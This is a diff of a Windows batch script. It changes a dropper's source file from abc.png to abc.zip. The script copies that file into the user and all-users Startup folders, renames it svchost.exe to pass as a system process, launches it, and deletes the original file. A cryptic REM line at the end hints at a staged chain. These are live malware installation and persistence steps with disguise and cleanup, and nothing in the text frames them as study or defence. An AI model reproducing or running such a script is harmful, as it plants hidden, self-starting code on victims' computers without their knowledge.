@@ -1,16 +1,16 @@
 
 
-echo f|xcopy /f ".\abc.png" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
-rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.png" "svchost.exe"
+echo f|xcopy /f ".\abc.zip" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
+rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip" "svchost.exe"
 
 start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
 
 
-echo f|xcopy ".\abc.png" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
-rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.png" "svchost.exe"
+echo f|xcopy ".\abc.zip" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
+rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc.zip" "svchost.exe"
 
-del ".\abc.png"
-del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.png"
+del ".\abc.zip"
+del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc.zip"
 
 
 REM // B -> P -> Z -> Net ->P ->MVOVS
